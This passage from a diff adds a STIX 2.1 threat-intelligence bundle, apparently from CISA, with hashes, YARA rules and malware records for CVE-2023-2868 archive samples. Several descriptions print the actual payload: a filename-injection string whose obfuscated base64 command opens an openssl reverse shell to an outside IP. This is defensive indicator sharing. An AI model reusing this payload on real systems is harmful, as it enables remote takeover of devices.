+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666612441-0a151727b565980001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='84603aa2f1d30f6b137a6b9300f2adcc' OR file:hashes.'SHA-1'='ab9942e172733ec3265dd93e0033e2ace77905c1' OR file:hashes.'SHA-256'='3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7' OR file:hashes.'SHA-512'='96499176dc81f64f3ab0daf7319bd1dc54301ccaada75d37a8377584f6044774e103361f207f6f204e62f251ae41e639f923c25cf2feee5b2557d10908bb54c5']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.465442Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--6982cd14-8ebe-5247-b722-c296f7b48a41",
+            "hashes": {
+                "MD5": "74b2cb4099ffb3a6eb2ada984f08a55c",
+                "SHA-1": "3a3d73662809b957c94407e7938c90a41e9b6023",
+                "SHA-256": "80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043",
+                "SHA-512": "4b4e7f5ef6fa006a3758649f2e664ca93198c3f82956c96975cafd815148b34eae7e7b6a3a2b9b632fe2f807713c536b77c7054ddd71a2851ed92ec7b4d26af0",
+                "SSDEEP": "96:81TMqi+YItziclXNI2dB+1jhXoueM1rHNqudK3b7OKiTcGuRNdecg6dxkXBd6UTS:Co+VmYXNvBkjh4tOLH4q6fbWS"
+            },
+            "size": 29883,
+            "name": "1666612600-0a151727b265b10001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--1589e5cf-1223-4c0b-b271-206c914b54cd",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666612600-0a151727b265b10001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201cb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.\u201d",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_08 rule_content=rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\n\t\tSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\n\t\tSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\n\t\tSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\n\t\tSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\n\t\tSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\n\t\tSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\n\t\tSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\n\t\tSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\n\t\tSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\n\t\tSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\tstrings:\n\t\t$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n\t\t$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n\t\t$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n\t\t$s4 = { 5a 45 63 78 64 }\n\t\t$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n\t\t$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n\t\t$s7 = { 4c 6e 52 34 64 41 }\n\tcondition:\n\t\t5 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.482668Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--0b98223e-2276-4654-abb5-27acfcfa98da",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "eset",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Linux/Exploit.CVE-2023-2868.A trojan",
+            "result": "unknown",
+            "sample_ref": "file--6982cd14-8ebe-5247-b722-c296f7b48a41"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--45416c0c-ee72-4852-9b2b-2ba40e273144",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201cb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.\u201d",
+            "malware_types": [
+                "backdoor",
+                "trojan"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--6982cd14-8ebe-5247-b722-c296f7b48a41"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--1c01a5ca-e394-459e-b676-f62a668e0c16",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666612600-0a151727b265b10001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='74b2cb4099ffb3a6eb2ada984f08a55c' OR file:hashes.'SHA-1'='3a3d73662809b957c94407e7938c90a41e9b6023' OR file:hashes.'SHA-256'='80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043' OR file:hashes.'SHA-512'='4b4e7f5ef6fa006a3758649f2e664ca93198c3f82956c96975cafd815148b34eae7e7b6a3a2b9b632fe2f807713c536b77c7054ddd71a2851ed92ec7b4d26af0']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.486199Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--3a024b41-7c3f-5fd8-ae40-b3e9efc058ab",
+            "hashes": {
+                "MD5": "e7f1555f9f9e9bca1898c720b2ef0866",
+                "SHA-1": "59ac617c7f6d779d0853921afbaf36574846ab9f",
+                "SHA-256": "f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa",
+                "SHA-512": "d5b930f4a13243ffd5ab43a50de5ba01154ee5054c4cea6830f583d761cd22828efd62e8cf35d5892649587b8982d3c8e7f4440a34ccc9b40761355a69372a06",
+                "SSDEEP": "96:7Rz1sZZqi+YIxiclk7342dB+1jhUQomK1rHNqudK3b7OKiTcGuRNdecg6dxkXBdu:7R+J+VcY43fBkjhxjkLH4q6fbOo"
+            },
+            "size": 29883,
+            "name": "1666614870-0a151727b166b50001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--60fd68d9-4d30-4c0f-98dc-d1bf7aff48c9",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666614870-0a151727b166b50001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201cb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.\u201d",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_08 rule_content=rule CISA_10454006_08 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868 encoded block\"\n\t\tSHA256_1 = \"0b917d945a7491869fa5003f6b85c09f5f45795a7852a8b63ba1abdc9797d6a6\"\n\t\tSHA256_2 = \"2a860849a9e68df0053556b85f20010a1384b4c87594ba4f9bb3e1b1d287b095\"\n\t\tSHA256_3 = \"3f2ca19ad3635f379968b0302c7e42cf954f85ab61166c6f70acfebc72f38ab7\"\n\t\tSHA256_4 = \"80342108e9f0f1fd6b5c44e88006cebe37e4eccb3a0f567636b22ad210c0a043\"\n\t\tSHA256_5 = \"9d0c7a45dd00d31a9724fa9e96cb8ac99dd5a6502fe4515cedaabb2e58b1c5f5\"\n\t\tSHA256_6 = \"b5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321\"\n\t\tSHA256_7 = \"b52a9844d8368abe70b6ba0d8df84f88c8c0029dcbcf599665acd703b255d5d2\"\n\t\tSHA256_8 = \"caa795c4c934219d287379b20c2912af0f815de95bb73e0f02f5fe6eb9aa50bd\"\n\t\tSHA256_9 = \"cf0996a3aee148bc060f4726435dd0d7f1af79082277f407dfa07d81181322ba\"\n\t\tSHA256_10 = \"f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa\"\n\tstrings:\n\t\t$s1 = { 59 57 4a 6a 5a 47 56 6d 5a }\n\t\t$s2 = { 59 7a 4a 57 4d 47 4d 79 62 47 74 4a 53 45 35 76 53 55 4d 78 61 }\n\t\t$s3 = { 54 44 4e 53 64 47 4e 44 4f }\n\t\t$s4 = { 5a 45 63 78 64 }\n\t\t$s5 = { 57 54 49 35 64 57 4a 74 56 6d 70 6b }\n\t\t$s6 = { 53 55 52 4a 4b 30 77 79 55 6d 78 6b 61 54 6c 31 5a 46 64 34 63 }\n\t\t$s7 = { 4c 6e 52 34 64 41 }\n\tcondition:\n\t\t5 of them\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.505592Z"
+        },
+        {
+            "type": "malware-analysis",
+            "spec_version": "2.1",
+            "id": "malware-analysis--a8eb5780-3201-463c-bbb4-c420890a8f8b",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "product": "eset",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "result_name": "Linux/Exploit.CVE-2023-2868.A trojan",
+            "result": "unknown",
+            "sample_ref": "file--3a024b41-7c3f-5fd8-ae40-b3e9efc058ab"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--c2243878-a430-41e6-bed2-4e6c4db6cac3",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact contains the same payloads as \u201cb5113e29ec23f6e1be289b99dc7ac2af1c252b4b6ff6e977f7827ab7fd686321.\u201d",
+            "malware_types": [
+                "backdoor",
+                "trojan"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--3a024b41-7c3f-5fd8-ae40-b3e9efc058ab"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--25595c29-b1dd-4a6f-b2ab-349a9faef9aa",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "1666614870-0a151727b166b50001-RIRGpJ",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='e7f1555f9f9e9bca1898c720b2ef0866' OR file:hashes.'SHA-1'='59ac617c7f6d779d0853921afbaf36574846ab9f' OR file:hashes.'SHA-256'='f536a7b75b7205762b75a037ebf6503029aab1a02afab14b2709797c32e7e0fa' OR file:hashes.'SHA-512'='d5b930f4a13243ffd5ab43a50de5ba01154ee5054c4cea6830f583d761cd22828efd62e8cf35d5892649587b8982d3c8e7f4440a34ccc9b40761355a69372a06']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.508354Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--cb4c2cdb-de2a-5e69-8595-c760fcb5bcff",
+            "hashes": {
+                "MD5": "42722b7d04f58dcb8bd80fe41c7ea09e",
+                "SHA-1": "1903a3553bcb291579206b39e7818c77e2c07054",
+                "SHA-256": "949d4b01f31256e5e9c2b04e557dcca0a25fc2f6aa3618936befc7525e1df788",
+                "SHA-512": "86f28510b50f1f0640065b2f5f6049d879c99c659b80dc4604942e2df8f7ff143f70acce05491f95e8eeff0718c69011c1c92d2611f3b86a5419c6dea1b802e0",
+                "SSDEEP": "48:G8n4+ntb7Ytb7bIbfj1ZbfjZGCGBCGpiK4rD1EK4rD1:GaXiXbELnLHGQGdqZq"
+            },
+            "size": 20480,
+            "name": "snapshot.tar",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--c8ed57c5-a4e4-4861-a6b2-41552c9cefdd",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "snapshot.tar",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact is a .tar sample that contains five files compressed. Four of the files within this .tar sample do not contain malicious capabilities. One of the files contains a malicious payload inside its filename that exploits CVE-2023-2868. Upon decompressing the archive the payload is seen below.\r\n\r\n--Begin Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Payload--",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10452108_03 rule_content=rule CISA_10452108_03 : backdoor communicates_with_c2 installs_other_components\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10452108\"\n\t\tDate = \"2023-06-20\"\n\t\tLast_Modified = \"\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"communicates-with-c2 installs-other-components\"\n\t\tMalware_Type = \"backdoor\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects malicious Linux reverse shell samples\"\n\t\tSHA256_1 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\n\tstrings:\n\t\t$s0 = { 6f 47 68 37 6f 68 63 34 }\n\t\t$s1 = { 41 6b 65 6f 38 61 68 58 }\n\t\t$s2 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\n\tcondition:\n\t\tall of them\n}\n 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_09 rule_content=rule CISA_10454006_09 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868\"\n\t\tSHA256_1 = \"949d4b01f31256e5e9c2b04e557dcca0a25fc2f6aa3618936befc7525e1df788\"\n\t\tSHA256_2 = \"f289b565839794fe4f450ed0c9343b8fb699f97544d9af2a60851abc8b4656e0\"\n\t\tSHA256_3 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\n\tstrings:\n\t\t$s1 = { 61 62 63 64 65 66 67 }\n\t\t$s2 = { 63 32 56 30 63 32 6c 6b 49 48 4e 6f 49 43 31 6a }\n\t\t$s3 = { 49 44 49 2b 4c 32 52 6c 64 69 39 75 64 57 78 73 }\n\t\t$s4 = { 49 43 39 30 62 58 41 76 }\n\t\t$s5 = { 59 32 39 75 62 6d 56 6a 64 }\n\t\t$n1 = { 6f 47 68 37 6f 68 63 34 }\n\t\t$n2 = { 41 6b 65 6f 38 61 68 58 }\n\t\t$n3 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\n\tcondition:\n\t\tall of ($s*) or all of ($n*)\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.52564Z"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--52699c03-0ebf-4fb8-bbb5-0ca4e6dc46ec",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact is a .tar sample that contains five files compressed. Four of the files within this .tar sample do not contain malicious capabilities. One of the files contains a malicious payload inside its filename that exploits CVE-2023-2868. Upon decompressing the archive the payload is seen below.\r\n\r\n--Begin Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6ODA4MCA+L3RtcC9wIDI+L2Rldi9udWxsO3JtIC90bXAvcCI=;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Payload--",
+            "malware_types": [
+                "backdoor",
+                "trojan"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--cb4c2cdb-de2a-5e69-8595-c760fcb5bcff"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--0f4a9d37-76f6-429f-b235-d2ae2aa177e4",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "snapshot.tar",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='42722b7d04f58dcb8bd80fe41c7ea09e' OR file:hashes.'SHA-1'='1903a3553bcb291579206b39e7818c77e2c07054' OR file:hashes.'SHA-256'='949d4b01f31256e5e9c2b04e557dcca0a25fc2f6aa3618936befc7525e1df788' OR file:hashes.'SHA-512'='86f28510b50f1f0640065b2f5f6049d879c99c659b80dc4604942e2df8f7ff143f70acce05491f95e8eeff0718c69011c1c92d2611f3b86a5419c6dea1b802e0']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.528447Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--2d16c63f-663a-5dbc-9bd7-6b01495cf09b",
+            "hashes": {
+                "MD5": "ac4fb6d0bfc871be6f68bfa647fc0125",
+                "SHA-1": "dc5841d8ed9ab8a5f3496f2258eafb1e0cedf4d3",
+                "SHA-256": "f289b565839794fe4f450ed0c9343b8fb699f97544d9af2a60851abc8b4656e0",
+                "SHA-512": "0ebf9a75b7bcae7b7e28bef4d8e81e53829678104b09220e684e54df211130fafaa3387f057cbe8fdf24a0138e1ac9f5f24d83f467c4e0469c7dff009e8381d5",
+                "SSDEEP": "48:G8nZm+ntb7Ytb7bIbfj1ZbfjZGCGBCGpiK4rD1EK4rD1:GmfXiXbELnLHGQGdqZq"
+            },
+            "size": 20480,
+            "name": "snapshot0.tar",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--5b4ae89e-90c2-4688-950c-2083d39bb76c",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "snapshot0.tar",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact is a .tar sample that contains five files compressed.  Four of the files within this .tar sample do not contain malicious capabilities.  One of the files contains a malicious payload inside its filename that exploits CVE-2023-2868. Upon decompressing the archive the payload is seen below.\r\n\r\n--Begin Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Payload--",
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": " 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10452108_03 rule_content=rule CISA_10452108_03 : backdoor communicates_with_c2 installs_other_components\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10452108\"\n\t\tDate = \"2023-06-20\"\n\t\tLast_Modified = \"\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"communicates-with-c2 installs-other-components\"\n\t\tMalware_Type = \"backdoor\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects malicious Linux reverse shell samples\"\n\t\tSHA256_1 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\n\tstrings:\n\t\t$s0 = { 6f 47 68 37 6f 68 63 34 }\n\t\t$s1 = { 41 6b 65 6f 38 61 68 58 }\n\t\t$s2 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\n\tcondition:\n\t\tall of them\n}\n 'namespace'='CISA_Consolidated.yara' rule_name=CISA_10454006_09 rule_content=rule CISA_10454006_09 : trojan backdoor remote_access_trojan accesses_remote_machines communicates_with_c2\n{\n\tmeta:\n\t\tAuthor = \"CISA Code & Media Analysis\"\n\t\tIncident = \"10454006\"\n\t\tDate = \"2023-07-05\"\n\t\tLast_Modified = \"20230712_1400\"\n\t\tActor = \"n/a\"\n\t\tFamily = \"n/a\"\n\t\tCapabilities = \"accesses-remote-machines communicates-with-c2\"\n\t\tMalware_Type = \"trojan backdoor remote-access-trojan\"\n\t\tTool_Type = \"unknown\"\n\t\tDescription = \"Detects reverse shell samples in TAR files used in CVE-2023-2868\"\n\t\tSHA256_1 = \"949d4b01f31256e5e9c2b04e557dcca0a25fc2f6aa3618936befc7525e1df788\"\n\t\tSHA256_2 = \"f289b565839794fe4f450ed0c9343b8fb699f97544d9af2a60851abc8b4656e0\"\n\t\tSHA256_3 = \"2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b\"\n\tstrings:\n\t\t$s1 = { 61 62 63 64 65 66 67 }\n\t\t$s2 = { 63 32 56 30 63 32 6c 6b 49 48 4e 6f 49 43 31 6a }\n\t\t$s3 = { 49 44 49 2b 4c 32 52 6c 64 69 39 75 64 57 78 73 }\n\t\t$s4 = { 49 43 39 30 62 58 41 76 }\n\t\t$s5 = { 59 32 39 75 62 6d 56 6a 64 }\n\t\t$n1 = { 6f 47 68 37 6f 68 63 34 }\n\t\t$n2 = { 41 6b 65 6f 38 61 68 58 }\n\t\t$n3 = { 65 65 71 75 65 69 37 41 30 39 33 30 32 }\n\tcondition:\n\t\tall of ($s*) or all of ($n*)\n}\n",
+            "pattern_type": "yara",
+            "valid_from": "2023-07-27T20:32:53.548796Z"
+        },
+        {
+            "type": "malware",
+            "spec_version": "2.1",
+            "id": "malware--19077f6d-feca-48f0-b39a-c924210b4ef4",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "description": "This artifact is a .tar sample that contains five files compressed.  Four of the files within this .tar sample do not contain malicious capabilities.  One of the files contains a malicious payload inside its filename that exploits CVE-2023-2868. Upon decompressing the archive the payload is seen below.\r\n\r\n--Begin Payload--\r\n'`abcdefg=c2V0c2lkIHNoIC1jICJta2ZpZm8gL3RtcC9wO3NoIC1pIDwvdG1wL3AgMj4mMXxvcGVuc3NsIHNfY2xpZW50IC1xdWlldCAtY29ubmVjdCAxMDcuMTQ4LjIyMy4xOTY6NDQzID4vdG1wL3AgMj4vZGV2L251bGw7cm0gL3RtcC9wIg==;ee=ba;G=s;\"ech\"o $abcdefg|${ee}se64 -d|${G}h;wh66489.txt`'\r\n--End Payload--",
+            "malware_types": [
+                "backdoor",
+                "trojan"
+            ],
+            "is_family": false,
+            "sample_refs": [
+                "file--2d16c63f-663a-5dbc-9bd7-6b01495cf09b"
+            ]
+        },
+        {
+            "type": "indicator",
+            "spec_version": "2.1",
+            "id": "indicator--a7ce824e-d993-4485-9dca-49f0c3716664",
+            "created_by_ref": "identity--8e112e72-aa8f-4190-a359-28a9abae2896",
+            "created": "2023-05-31T22:05:06.000Z",
+            "modified": "2023-05-31T22:05:06.000Z",
+            "name": "snapshot0.tar",
+            "object_marking_refs": [
+                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487"
+            ],
+            "indicator_types": [
+                "malicious-activity"
+            ],
+            "pattern": "[file:hashes.'MD5'='ac4fb6d0bfc871be6f68bfa647fc0125' OR file:hashes.'SHA-1'='dc5841d8ed9ab8a5f3496f2258eafb1e0cedf4d3' OR file:hashes.'SHA-256'='f289b565839794fe4f450ed0c9343b8fb699f97544d9af2a60851abc8b4656e0' OR file:hashes.'SHA-512'='0ebf9a75b7bcae7b7e28bef4d8e81e53829678104b09220e684e54df211130fafaa3387f057cbe8fdf24a0138e1ac9f5f24d83f467c4e0469c7dff009e8381d5']",
+            "pattern_type": "stix",
+            "pattern_version": "2.1",
+            "valid_from": "2023-07-27T20:32:53.551379Z"
+        },
+        {
+            "type": "file",
+            "spec_version": "2.1",
+            "id": "file--1d637deb-c006-5ce3-a7e2-2061ea0c9ae0",
+            "hashes": {
+                "MD5": "fe1e2d676c91f899b706682b70176983",
+                "SHA-1": "77b1864c489affe0ac2284135050373951b7987e",
+                "SHA-256": "2a5de691243f2b91f164c3021c157fbd783b4f3e7d5f5950182e52ec868cd40b",
